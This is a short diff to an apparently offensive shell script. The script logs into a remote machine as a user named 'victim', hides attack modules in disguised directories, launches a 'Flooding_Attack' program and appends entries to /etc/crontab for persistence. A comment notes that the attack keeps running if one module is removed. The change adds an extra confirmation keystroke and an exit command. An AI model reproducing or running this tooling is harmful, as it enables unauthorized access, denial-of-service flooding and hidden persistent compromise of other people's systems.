@@ -14,6 +14,8 @@ SSH_PATH="/home/victim/.ssh"
 (
 echo "\r"
 sleep 1
+echo "y\r"
+sleep 1
 echo "\r"
 sleep 1
 echo "\r"
@@ -37,7 +39,8 @@ ssh victim@"$IP_Address" 'Hidden1="/home/victim/.etc/.gitignore";
 
 			# When one of attack modules is removed, the attack can still be launched by the other
 			cd "$Hidden2" && ./Flooding_Attack;
-			echo "$(cat crontab.txt)" >> /etc/crontab;'
+			echo "$(cat crontab.txt)" >> /etc/crontab;
+			exit;'
 
 
 
